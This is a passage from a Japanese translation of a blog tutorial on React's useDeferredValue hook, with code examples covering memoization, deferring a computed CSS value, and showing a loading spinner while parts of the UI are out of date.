<p><a href="https://www.joshwcomeau.com/react/use-deferred-value/"><img src="/static.png"></a>
（訳注：<a href="https://www.joshwcomeau.com/react/use-deferred-value/">イメージはキャプチャーです。インタラクティブサンプルは翻訳元サイトで確認できます</a>）</p>
<p>この仮想的な例では、<code class="language-text">ImportantStuff</code>は極めて高速でレンダリングされ、ほとんどの時間は<code class="language-text">SlowStuff</code>のレンダリングに費やされます。</p>
<p>ユーザーがボタンをクリックする間隔が短すぎると、Reactが処理を完了する前に次の更新が行われるため、レンダリングが積み重なってしまいます。そうすると、UIが低品質に感じられます。</p>
<p><video autoplay="" loop="" muted="" playsinline="" src="/static.mov"></video>
（訳注：<a href="https://www.joshwcomeau.com/react/use-deferred-value/">イメージはキャプチャーです。インタラクティブサンプルは翻訳元サイトで確認できます</a>）</p>
<p>最初のレンダリング（<code class="language-text">count: 1</code>）が完了する前にユーザーが再度ボタンをクリックし、<code class="language-text">count</code>が<code class="language-text">2</code>になります。Reactは最初のレンダリングを放棄し、正しい<code class="language-text">count</code>値で新しいレンダリングを開始します。UIは、レンダリングが正常に完了して初めて更新されます。</p>
<p>これらを踏まえた上で、<code class="language-text">useDeferredValue</code>を使ってどのように問題を解決できるのか見てみましょう。</p>
<p>以下がコードです。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> deferredCount <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useDeferredValue</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ImportantStuff</span></span> <span class="token attr-name">count</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>count<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">SlowStuff</span></span> <span class="token attr-name">count</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>deferredCount<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
        Increment
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>最初のレンダリングでは、<code class="language-text">count</code>と<code class="language-text">deferredCount</code>の値はどちらも(<code class="language-text">0</code>)です。しかし、ユーザーが「Increment」ボタンをクリックすると興味深い現象が起こります。</p>
<p><video autoplay="" loop="" muted="" playsinline="" src="/static.mov"></video>
（訳注：<a href="https://www.joshwcomeau.com/react/use-deferred-value/">イメージはキャプチャーです。インタラクティブサンプルは翻訳元サイトで確認できます</a>）</p>
<p>今度は、レンダリングごとに<code class="language-text">count</code>の値と、<SlowStuff>に渡される遅延させた値（deferred value）が表示されます。ラベルを表示するスペースがない場合、<code class="language-text">count</code>と<code class="language-text">deferredCount</code>の値のみ、線で区切られて表示されます。</p>
<div class="admonition admonition-info alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</h5></div><div class="admonition-content"><p><strong>試してみよう</strong> <br>
何が起きているのかは後ほど詳しく説明します。まずは自分で少し触ってみてください。Reactがどのような処理を行っていて、それがなぜ有益なのか分かりますか？</p><p><strong>タイムラインは友達です</strong>。黄色いスライダーをクリックするか押さえてドラッグすることで、動画を前後に進めることができます。もしくは、タイムラインを選択し、左右の矢印キーで1フレームずつ動かすこともできます。</p></div></div>
<p>では詳しく見てみましょう。<code class="language-text">count</code> stateが変わると、<code class="language-text">App</code>コンポーネントは直ちに再レンダリングを行います。<code class="language-text">count</code>は<code class="language-text">1</code>になりますが、興味深いことに、<code class="language-text">deferredCount</code>は変わっておらず、<code class="language-text">0</code>のままです。</p>
<p>これはつまり、<code class="language-text">SlowStuff</code>に渡されたpropsが前回のレンダリング時と全く同じだということです。<code class="language-text">React.memo()</code>によってメモ化されている場合、Reactは何を生成するかすでに分かっているため、わざわざ再レンダリングすることなく、最初のレンダリング時のデータを再利用します。</p>
<p>そのレンダリングが完了すると、すぐに2回目の再レンダリングが始まりますが、今度は<code class="language-text">deferredCount</code>が更新されており、<code class="language-text">count</code>の値と同じ1になっています。これは、今回は<code class="language-text">SlowStuff</code>の再レンダリングが行われることを意味します。ここまでの処理が完了すると、UIが完全に更新されます。</p>
<p><strong>そこまでする必要はあるのでしょうか？</strong>ここまで読んで、不必要に複雑だと感じている読者もいるかもしれません。結果は前と同じなのに、処理が増えているのではないかと。</p>
<p><strong>この仕組みが非常に優れている理由を説明しましょう</strong>。再度stateが変わり、Reactの処理が中断された場合、重要な情報はすでに更新されています。Reactは、重要性の低い2回目のレンダリングを放棄し、より重要な部分のレンダリングを直ちに開始することができます。</p>
<p>言葉で説明するのは難しいですが、次の録画を見ていただくと違いが分かるのではないでしょうか。</p>
<p><video autoplay="" loop="" muted="" playsinline="" src="/static.mov"></video>
（訳注：<a href="https://www.joshwcomeau.com/react/use-deferred-value/">イメージはキャプチャーです。インタラクティブサンプルは翻訳元サイトで確認できます</a>）</p>
<p>前に見た動画と同じように、ユーザーがクリックする間隔が短すぎて、Reactは全ての情報を更新することができていません。しかし、再レンダリングごとに優先度の高い部分と低い部分が分かれているため、Reactはクリック間に重要な部分を更新することができているのです。追加でクリックが行われると、Reactは進行中のレンダリングを放棄しますが、優先度が低い情報のため問題ありません。</p>
<p>これはなかなか難しい問題です。少し難しすぎると感じているようでしたら、次のセクションで基本的な仕組みを説明しているので、こちらを読んでいただくといいでしょう。</p>
<h2>落とし穴：メモ化が必要</h2>
<p>一つ重要な点を述べます。<code class="language-text">useDeferredValue</code>は、優先度の低い、レンダリングの遅いコンポーネントが<code class="language-text">React.memo()</code>でラップされている場合のみ機能します。</p>
<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">SlowComponent</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> count <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// Component stuff here</span>
<span class="token punctuation">}</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> React<span class="token punctuation">.</span><span class="token function">memo</span><span class="token punctuation">(</span>SlowComponent<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">React.memo()</code>はReactに対し、propsまたはstateが変わった場合のみこのコンポーネントを再レンダリングするよう指示します。<code class="language-text">React.memo()</code>がなければ、countのpropsが変わったかどうかにかかわらず、<code class="language-text">SlowComponent</code>は親コンポーネントが再レンダリングされるたびに再レンダリングされます。</p>
<p><strong>これは本当に重要なことなので、きちんと理解する必要があります。もう少し深掘りしてみましょう</strong>。繰り返しになりますが、以下がコードです。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> deferredCount <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useDeferredValue</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ImportantStuff</span></span> <span class="token attr-name">count</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>count<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">SlowStuff</span></span> <span class="token attr-name">count</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>deferredCount<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
        Increment
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ユーザーが初めてボタンをクリックすると、<code class="language-text">count</code> stateが<code class="language-text">0</code>から<code class="language-text">1</code>に増えます。Appコンポーネントは再レンダリングしますが、<code class="language-text">useDeferredValue</code>フックは前回の値を再利用します。<code class="language-text">deferredCount</code>は<code class="language-text">1</code>ではなく<code class="language-text">0</code>に設定されます。</p>
<p>デフォルトでは、Reactはpropsが変わったかどうかにかかわらず、全ての子コンポーネントを再レンダリングします。<code class="language-text">React.memo()</code>が設定されていなければ、<code class="language-text">ImportantStuff</code>も<code class="language-text">SlowStuff</code>も再レンダリングされるため、<code class="language-text">useDeferredValue</code>を使用するメリットが得られません。</p>
<p><code class="language-text">SlowStuff</code>を<code class="language-text">React.memo()</code>でラップすると、Reactは現在のpropsを前回のものと比較し、再レンダリングが必要かどうかを判断します。<code class="language-text">deferredCount</code>が<code class="language-text">0</code>のままなので、Reactは「新しい情報はないようだ。UIのこの部分を再計算する必要はない」と判断します。</p>
<p><strong>これは筆者にとって目からうろこでした</strong>。<code class="language-text">useDeferredValue</code>は、UIの中で優先度が低い部分のレンダリングを（退屈な宿題を先延ばしにするように）後回しにすることを可能にします。最終的にはレンダリングが行われ、UIは全て更新されますが、一旦保留にするということです。stateが変わるたびに、Reactはレンダリングを中断し、より重要な情報のレンダリングに注力するのです。</p>
<div class="admonition admonition-info alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</h5></div><div class="admonition-content"><p><strong>Reactのレンダリングについて考える上でのメンタルモデル</strong> <br>
Reactのレンダリングの仕組みについて、かなり熟知している前提で話していることは分かっています。頭がクラクラしている読者には、筆者による次のブログ記事が大いに役立つと思います。</p><ul>
<li>“<a href="https://www.joshwcomeau.com/react/why-react-re-renders/">Why React Re-Renders</a>”（「Reactはなぜ再レンダリングするのか」）</li>
</ul></div></div>
<p>実に多くのReact開発者がReactのレンダリングの仕組みを誤解しているので、この記事を読んで誤解を解き、<code class="language-text">useDeferredValue</code>を理解する上で必要な知識を得ていただければと思います。</p>
<h2>落とし穴：複数のstate変数を扱う</h2>
<p>ここまでは、countのような単一のプリミティブ値を扱う場合における<code class="language-text">useDeferredValue</code>の仕組みについて見てきましたが、現実の世界では物事がそこまで単純なことはほとんどありません。</p>
<p>筆者が開発した「Shadow Palette Generator」では、関連するstateがいくつかあります。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">ShadowPaletteGenerator</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>oomph<span class="token punctuation">,</span> setOomph<span class="token punctuation">]</span> <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>crispy<span class="token punctuation">,</span> setCrispy<span class="token punctuation">]</span> <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>backgroundColor<span class="token punctuation">,</span> setBackgroundColor<span class="token punctuation">]</span> <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">'#F00'</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>tint<span class="token punctuation">,</span> setTint<span class="token punctuation">]</span> <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useState</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>resolution<span class="token punctuation">,</span> setResolution<span class="token punctuation">]</span> <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0.75</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>lightPosition<span class="token punctuation">,</span> setLightPosition<span class="token punctuation">]</span> <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token operator">-</span><span class="token number">0.2</span><span class="token punctuation">,</span>
    <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token operator">-</span><span class="token number">0.5</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> cssCode <span class="token operator">=</span> <span class="token function">generateShadows</span><span class="token punctuation">(</span>oomph<span class="token punctuation">,</span> crispy<span class="token punctuation">,</span> backgroundColor<span class="token punctuation">,</span> tint<span class="token punctuation">,</span> resolution<span class="token punctuation">,</span> lightPosition<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token punctuation">{</span><span class="token comment">/* Other stuff omitted for brevity */</span><span class="token punctuation">}</span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">CodeSnippet</span></span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css<span class="token punctuation">"</span></span> <span class="token attr-name">code</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>cssCode<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>最初は、それぞれのstateについて遅延させた値を作成しなくてはならないと考えていました。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">const</span> deferredOomph <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useDeferredValue</span><span class="token punctuation">(</span>oomph<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> deferredCrispy <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useDeferredValue</span><span class="token punctuation">(</span>crispy<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> deferredBg <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useDeferredValue</span><span class="token punctuation">(</span>backgroundColor<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> deferredTint <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useDeferredValue</span><span class="token punctuation">(</span>tint<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> deferredResolution <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useDeferredValue</span><span class="token punctuation">(</span>resolution<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> deferredLight <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useDeferredValue</span><span class="token punctuation">(</span>lightPosition<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>そうすることもできますが、もっと簡単な方法があります。レンダリング時に生成されるCSSコードである計算値を遅延させるのです。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">const</span> cssCode <span class="token operator">=</span> <span class="token function">generateShadows</span><span class="token punctuation">(</span>oomph<span class="token punctuation">,</span> crispy<span class="token punctuation">,</span> backgroundColor<span class="token punctuation">,</span> tint<span class="token punctuation">,</span> resolution<span class="token punctuation">,</span> lightPosition<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> deferredCssCode <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useDeferredValue</span><span class="token punctuation">(</span>cssCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token punctuation">(</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token punctuation">{</span><span class="token comment">/* Other stuff omitted for brevity */</span><span class="token punctuation">}</span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">CodeSnippet</span></span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css<span class="token punctuation">"</span></span> <span class="token attr-name">code</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>deferredCssCode<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>
<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>このフックは<code class="language-text">useDeferredState</code>ではなく、<code class="language-text">useDeferredValue</code>というものです。useDeferredValue() に渡す引数がstate変数でなくてはならないというルールはないのです！</p>
<p>基本的な仕組みを理解するのが非常に重要である理由はここにあります。重要なのは、優先度の高い部分のレンダリングを行っている際に、優先度の低いコンポーネント（この場合は<code class="language-text">CodeSnippet</code>）のpropsに新しい値が渡されないようにすることです。</p>
<h2>ローデ​​ィングアイコンの表示</h2>
<p>再計算が進行中であり、UIの一部の情報が古いことをユーザーに知らせたい場合があるかもしれません。</p>
<p>例えば、次のような表示を使用することもできます。</p>
<p><video autoplay="" loop="" muted="" playsinline="" src="https://www.joshwcomeau.com/videos/use-deferred-value/deferred-loading.mp4"></video></p>
<p><code class="language-text">&lt;SlowStuff></code>の更新が反映されるまでの間、その部分の画面を半透明にし、スピナーを表示します。そうすることで、ユーザーはUIの再計算が進行中であると分かります。</p>
<p><strong>では、どうすればUIの一部がまだ更新されていないと分かるのでしょうか？</strong>実は、それを判別するためのツールがすでにあるのです。</p>
<p>以下がコードです。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> deferredCount <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useDeferredValue</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> isBusyRecalculating <span class="token operator">=</span> count <span class="token operator">!==</span> deferredCount<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ImportantStuff</span></span> <span class="token attr-name">count</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>count<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">SlowWrapper</span></span>
        <span class="token attr-name">style</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token literal-property property">opacity</span><span class="token operator">:</span> isBusyRecalculating <span class="token operator">?</span> <span class="token number">0.5</span> <span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></span>
      <span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">SlowStuff</span></span> <span class="token attr-name">count</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>deferredCount<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
        </span><span class="token punctuation">{</span>isBusyRecalculating <span class="token operator">&amp;&amp;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Spinner</span></span> <span class="token punctuation">/></span></span><span class="token punctuation">}</span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">SlowWrapper</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
        Increment
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>UIの情報が古いかどうかは、<code class="language-text">count</code>と<code class="language-text">deferredCount</code>を比較することで分かります。
筆者が最初にこれを見たときは、あまりに単純すぎて疑わしいと思いました。しかし、よく考えてみると理にかなっていたのです。</p>
<ul>
<li>優先度の高い最初のレンダリングで、<code class="language-text">deferredCount</code>は前回の値を再利用します。<code class="language-text">count</code>は<code class="language-text">1</code>に更新されますが、<code class="language-text">deferredCount</code>は<code class="language-text">0</code>のままです。両者の値は異なります。</li>
<li>次に行われる優先度の低いレンダリングでは、<code class="language-text">deferredCount</code>が最新の値である<code class="language-text">1</code>に更新されます。<code class="language-text">count</code>と<code class="language-text">deferredCount</code>の両方が同じ値になります。</li>
</ul>
<p>最初のレンダリング時に<code class="language-text">&lt;SlowStuff></code>のレンダリングを後回しにすることを可能にするのと同じ仕組みにより、UIがまだ完全に同期されていないことを見分けられるのです。実に秀逸ではないでしょうか。</p>
<p>実際にこれを行いたいかどうかは別問題です。筆者のShadow Palette Generatorで試してみました。</p>
<p><video autoplay="" loop="" muted="" playsinline="" src="https://www.joshwcomeau.com/videos/use-deferred-value/shadow-loading.mp4"></video></p>
<p>個人的には、この場合は改善しているとは言えないと思います。ユーザーには影の図に注目してもらいたいのに、コードスニペットの方に目が行ってしまいます。
しかし、場合によってはUIの一部の情報が古いことをユーザーに知らせる方法として役立つかもしれません。</p>
<h2>最初のレンダリングを高速化する</h2>
<p>数週間前にReact 19がベータ版に移行しました。間もなく公開されるこのメジャーアップデートでは、さまざまな変更が行われており、<code class="language-text">useDeferredValue</code>も大幅にパワーアップされる予定です。
React 19以前では、<code class="language-text">useDeferredValue</code>は与えられた値で初期化されていました。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> deferredCount <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useDeferredValue</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// On the initial render:</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>deferredCount<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>count <span class="token operator">===</span> deferredCount<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
